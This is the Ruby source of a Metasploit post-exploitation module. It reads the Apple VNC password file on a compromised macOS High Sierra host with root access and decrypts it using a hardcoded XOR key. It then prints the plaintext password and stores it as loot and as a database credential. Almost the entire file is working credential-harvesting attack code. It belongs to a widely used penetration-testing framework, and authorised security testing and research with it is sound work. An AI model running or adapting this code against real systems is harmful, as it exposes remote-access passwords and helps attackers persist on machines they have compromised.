##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::OSX::Priv
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OS X Display Apple VNC Password',
        'Description' => %q{
          This module shows Apple VNC Password from Mac OS X High Sierra.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Kevin Gonzalvo <interhack[at]gmail.com>'],
        'Platform' => [ 'osx' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def decrypt_hash(hash)
    return if hash.blank?

    aux = ['1734516E8BA8C5E2FF1C39567390ADCA'].pack('H*')
    fixedkey = aux.unpack('C*')

    str_pw = [hash.to_s].pack('H*')
    array_pwd = str_pw.unpack('C*')
    str = ''

    for data in fixedkey
      str += (data ^ array_pwd.shift).chr
    end

    return str.delete("\0")
  end

  def run
    unless is_root?
      fail_with(Failure::NoAccess, 'Root privileges are required to read VNC password file')
    end

    print_status('Checking VNC Password...')
    vncsettings_path = '/Library/Preferences/com.apple.VNCSettings.txt'
    passwd_encrypt = read_file(vncsettings_path.to_s)
    final_passwd = decrypt_hash(passwd_encrypt.to_s)

    if final_passwd.nil?
      print_error('Password not found')
      return
    end

    print_good("Password Found: #{final_passwd}")
    pass_file = store_loot('osx.vnc.password', 'text/plain', session, final_passwd, 'passwd.pwd', 'OSX VNC Password')
    print_good("Password data stored as loot in: #{pass_file}")
    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: fullname,
      private_type: :password,
      private_data: final_passwd.to_s,
      workspace_id: myworkspace_id
    }
    create_credential(credential_data)
  end
end
